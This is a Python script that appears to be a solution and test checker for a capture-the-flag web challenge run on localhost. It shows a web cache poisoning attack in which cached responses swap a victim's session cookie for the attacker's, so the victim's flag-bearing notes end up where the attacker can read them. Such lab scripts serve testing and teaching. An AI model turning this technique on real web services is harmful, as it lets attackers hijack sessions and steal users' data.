import requests
import sys
import json
import time

BASE = "http://127.0.0.1:9090"
#BASE = "http://localhost:5000"
COOKIE_NAME = "session"
FLAG = "FLAG{TESTVAL}"

proxies = {
	"http": "http://localhost:8080"
}
#proxies = None

def do_victim():
	# Victim logs in, get cookie
	s_victim = requests.Session()
	login(s_victim, "Mr. Y", "b")
	cookie_victim = s_victim.cookies[COOKIE_NAME]
	# Victim loads missionlist
	missions = get_missionlist(s_victim)
	assert len(missions) >= 4

	# Iterate missions, verify cookies after each one and send the post request
	# The POST request will add the notes to the mission of the victim user, unless the cookie got replaced by a recently cached response
	for mission in missions:
		name = mission["name"]
		print(f"\t.. getting missioninfo for {name}")
		get_missioninfo(s_victim, name)
		if name.startswith("imgs"):
			assert s_victim.cookies[COOKIE_NAME] != cookie_victim
		#else:
		#	assert s_victim.cookies[COOKIE_NAME] == cookie_victim
		# POST
		add_data(s_victim, f"We have a mission {mission['name']}. Statusupdate: {FLAG}")
	logout(s_victim)

def test_directaccess():
	s_attack = requests.Session()
	login(s_attack, "Mr. R", "a")
	data = get_data(s_attack, "a").content.decode()
	assert FLAG not in data

# To get the flag, we want to enforce the knowledge of the password
# otherwise, you could simply get the victims cookie and retrieve the flag
# without creating your own mission
# This tests tries exactly this
def test_nopwd():
	s_test = requests.Session()
	login(s_test, "Mr. R", "a")
	cookie = s_test.cookies[COOKIE_NAME]
	get_missioninfo(s_test, "imgstest")
	assert cookie != s_test.cookies[COOKIE_NAME] # Changed cookie
	x = get_data(s_test)
	assert x.status_code == 400
	assert FLAG not in x.content.decode()

def login(session, mission, secret):
	r = session.post(
		f"{BASE}/api/authenticate",
		json = {
			"mission": mission,
			"secret": secret
		}, proxies = proxies)

def logout(session):
	session.get(
		f"{BASE}/api/logout"
		, proxies = proxies)

def get_missioninfo(session, mission):
	session.get(
		f"{BASE}/api/missioninfo/{mission}"
		, proxies = proxies)

def get_missionlist(session):
	return session.get(
		f"{BASE}/api/missions"
	, proxies = proxies).json()

def add_data(session, data):
	session.post(
		f"{BASE}/api/add_data",
		json = {
			"data": data
		}, proxies = proxies)

def get_data(session, secret = None):
	j = {}
	if secret != None:
		j["secret"] = secret
	return session.post(
		f"{BASE}/api/get_data"
		, json = j
		, proxies = proxies)

# Sessions
s_attack = requests.Session()

# Attacker logs in, get cookie
login(s_attack, "imgstest", "d")
cookie_attack = s_attack.cookies[COOKIE_NAME]

# Attacker loads his own missioninfo
get_missioninfo(s_attack, "imgstest")
#assert s_attack.cookies[COOKIE_NAME] == cookie_attack # this fails when the test is run the second time before the cache expired

do_victim()

# Verify data in attacker
data = get_data(s_attack, "d") # get_data, but the s_attack session now has the s_victim cookie
assert FLAG in data.content.decode(), f"content is {data.content.decode()}"
logout(s_attack)

# further tests
test_directaccess()
test_nopwd()
